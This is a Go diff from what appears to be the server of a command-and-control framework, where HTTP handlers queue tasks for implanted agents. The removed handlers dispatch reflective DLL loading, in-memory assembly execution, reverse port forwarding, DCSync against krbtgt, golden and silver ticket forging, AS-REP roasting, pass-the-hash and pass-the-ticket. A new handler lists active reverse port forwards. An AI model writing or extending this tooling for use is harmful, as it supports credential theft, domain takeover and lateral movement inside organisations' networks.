@@ -1,9 +1,7 @@
 package server
 
 import (
-	"encoding/base64"
 	"fmt"
-	"io"
 	"log/slog"
 	"net"
 	"net/http"
@@ -15,267 +13,6 @@ import (
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
 )
-
-// ── P0-1: Reflective PE Loader ─────────────────────────────────────────────
-func (s *Server) handlePELoader(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	file, err := c.FormFile("dll")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "DLL file required"})
-		return
-	}
-	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("DLL too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read DLL"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read DLL data"})
-		return
-	}
-	b64Data := base64.StdEncoding.EncodeToString(data)
-
-	task, err := s.createTask(id, "peloader", "", "", "", b64Data, 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("PE loader requested", "agent", id, "dll", file.Filename, "size", len(data))
-	s.LogAuditRecord(c, "peloader", "agent", id, fmt.Sprintf("Reflective DLL: %s (%d bytes)", file.Filename, len(data)), true, nil)
-	s.dispatchTask(c, task, "peloader", file.Filename)
-}
-
-// ── P0-2: Execute-Assembly fork&run ────────────────────────────────────────
-func (s *Server) handleExecuteAssemblyForkRun(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	file, err := c.FormFile("assembly")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
-		return
-	}
-	if file.Size > MaxUploadSize {
-		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("assembly too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly data"})
-		return
-	}
-	b64Data := base64.StdEncoding.EncodeToString(data)
-
-	task, err := s.createTask(id, "execute_assembly_forkrun", "", "", "", b64Data, 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Execute-assembly fork&run requested", "agent", id, "assembly", file.Filename, "size", len(data))
-	s.LogAuditRecord(c, "execute_assembly_forkrun", "agent", id, fmt.Sprintf("Assembly fork&run: %s (%d bytes)", file.Filename, len(data)), true, nil)
-	s.dispatchTask(c, task, "execute_assembly_forkrun", file.Filename)
-}
-
-// ── P0-3: Reverse Port Forward ────────────────────────────────────────────
-func (s *Server) handleRPortFwdStart(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	localPort := c.PostForm("lport")
-	forwardTarget := c.PostForm("target")
-	if localPort == "" || forwardTarget == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "lport and target required"})
-		return
-	}
-
-	cmd := localPort + "|" + forwardTarget
-	task, err := s.createTask(id, "rportfwd_start", cmd, "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Reverse port forward started", "agent", id, "lport", localPort, "target", forwardTarget)
-	s.LogAuditRecord(c, "rportfwd_start", "agent", id, fmt.Sprintf("rportfwd :%s -> %s", localPort, forwardTarget), true, nil)
-	s.dispatchTask(c, task, "rportfwd_start", cmd)
-}
-
-func (s *Server) handleRPortFwdStop(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "rportfwd_stop", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Reverse port forward stopped", "agent", id)
-	s.LogAuditRecord(c, "rportfwd_stop", "agent", id, "rportfwd stop", true, nil)
-	s.dispatchTask(c, task, "rportfwd_stop", "")
-}
-
-// ── P0-4: Kerberos Attacks ────────────────────────────────────────────────
-func (s *Server) handleDCSync(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	user := c.PostForm("user")
-	if user == "" {
-		user = "krbtgt"
-	}
-	task, err := s.createTask(id, "dcsync", user, "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("DCSync requested", "agent", id, "user", user)
-	s.LogAuditRecord(c, "dcsync", "agent", id, fmt.Sprintf("DCSync user=%s", user), true, nil)
-	s.dispatchTask(c, task, "dcsync", user)
-}
-
-func (s *Server) handleGoldenTicket(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	user := c.PostForm("user")
-	domain := c.PostForm("domain")
-	sid := c.PostForm("sid")
-	krbtgtHash := c.PostForm("krbtgt_hash")
-	if user == "" || domain == "" || sid == "" || krbtgtHash == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, sid, and krbtgt_hash are required"})
-		return
-	}
-	cmd := strings.Join([]string{user, domain, sid, krbtgtHash}, "|")
-	task, err := s.createTask(id, "golden_ticket", cmd, "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Golden ticket requested", "agent", id, "user", user, "domain", domain)
-	s.LogAuditRecord(c, "golden_ticket", "agent", id, fmt.Sprintf("Golden ticket: %s@%s /sid=%s", user, domain, sid), true, nil)
-	s.dispatchTask(c, task, "golden_ticket", cmd)
-}
-
-func (s *Server) handleSilverTicket(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	user := c.PostForm("user")
-	domain := c.PostForm("domain")
-	sid := c.PostForm("sid")
-	target := c.PostForm("target")
-	rc4Hash := c.PostForm("rc4_hash")
-	if user == "" || domain == "" || sid == "" || target == "" || rc4Hash == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, sid, target, and rc4_hash are required"})
-		return
-	}
-	cmd := strings.Join([]string{user, domain, sid, target, rc4Hash}, "|")
-	task, err := s.createTask(id, "silver_ticket", cmd, "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Silver ticket requested", "agent", id, "user", user, "domain", domain, "target", target)
-	s.LogAuditRecord(c, "silver_ticket", "agent", id, fmt.Sprintf("Silver ticket: %s@%s -> %s", user, domain, target), true, nil)
-	s.dispatchTask(c, task, "silver_ticket", cmd)
-}
-
-func (s *Server) handleASREPRoast(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "asreproast", "", "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("ASREP roast requested", "agent", id)
-	s.LogAuditRecord(c, "asreproast", "agent", id, "ASREP roast requested", true, nil)
-	s.dispatchTask(c, task, "asreproast", "")
-}
-
-func (s *Server) handlePassTheHash(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	user := c.PostForm("user")
-	domain := c.PostForm("domain")
-	ntlmHash := c.PostForm("ntlm_hash")
-	target := c.PostForm("target")
-	if user == "" || domain == "" || ntlmHash == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, and ntlm_hash are required"})
-		return
-	}
-	cmd := strings.Join([]string{user, domain, ntlmHash, target}, "|")
-	task, err := s.createTask(id, "pass_the_hash", cmd, "", "", "", 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Pass-the-hash requested", "agent", id, "user", user, "domain", domain)
-	s.LogAuditRecord(c, "pass_the_hash", "agent", id, fmt.Sprintf("PTH: %s@%s", user, domain), true, nil)
-	s.dispatchTask(c, task, "pass_the_hash", cmd)
-}
-
-func (s *Server) handlePassTheTicket(c *gin.Context) {
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	file, err := c.FormFile("ticket")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "ticket file (.kirbi) required"})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read ticket"})
-		return
-	}
-	defer f.Close()
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read ticket data"})
-		return
-	}
-	b64Data := base64.StdEncoding.EncodeToString(data)
-
-	task, err := s.createTask(id, "pass_the_ticket", "", "", "", b64Data, 0, 0)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
-		return
-	}
-	slog.Info("Pass-the-ticket requested", "agent", id, "file", file.Filename)
-	s.LogAuditRecord(c, "pass_the_ticket", "agent", id, fmt.Sprintf("PTT: %s (%d bytes)", file.Filename, len(data)), true, nil)
-	s.dispatchTask(c, task, "pass_the_ticket", file.Filename)
-}
 
 // ── P0-3: rportfwd server-side relay (binds local port, relays via beacon) ─
 func (s *Server) handleRPortFwdRelayStart(c *gin.Context) {
@@ -345,6 +82,38 @@ func (s *Server) handleRPortFwdStatus(c *gin.Context) {
 	}
 
 	c.JSON(http.StatusOK, gin.H{"active": false})
+}
+
+// handleRPortFwdGlobalStatus returns status of all active reverse port forwards.
+func (s *Server) handleRPortFwdGlobalStatus(c *gin.Context) {
+	s.rportfwdMu.Lock()
+	defer s.rportfwdMu.Unlock()
+
+	type fwdInfo struct {
+		AgentID     string `json:"agent_id"`
+		LocalPort   int    `json:"local_port"`
+		RemoteHost  string `json:"remote_host"`
+		RemotePort  int    `json:"remote_port"`
+		Protocol    string `json:"protocol"`
+		Active      bool   `json:"active"`
+	}
+	forwards := make([]fwdInfo, 0, len(s.rportfwdListeners))
+	for _, relay := range s.rportfwdListeners {
+		host, portStr, _ := strings.Cut(relay.forwardTarget, ":")
+		rport, _ := strconv.Atoi(portStr)
+		forwards = append(forwards, fwdInfo{
+			AgentID:    relay.agentID,
+			LocalPort:  relay.localPort,
+			RemoteHost: host,
+			RemotePort: rport,
+			Protocol:   "tcp",
+			Active:     relay.listener != nil,
+		})
+	}
+	if forwards == nil {
+		forwards = []fwdInfo{}
+	}
+	c.JSON(http.StatusOK, gin.H{"forwards": forwards})
 }
 
 func (s *Server) handleRPortFwdRelayStop(c *gin.Context) {
@@ -479,8 +248,7 @@ func (s *Server) processRPortFwdData(agentID string, frame socksFrame) {
 	defer s.rportfwdMu.Unlock()
 	for key, relay := range s.rportfwdListeners {
 		if strings.HasPrefix(key, agentID+":") {
-			_ = relay
-			// Write data to the operator's TCP connection
+	// Write data to the operator's TCP connection
 			if relay.listener != nil {
 				relay.listener.mu.Lock()
 				conn, ok := relay.listener.connMap[frame.ConnID]
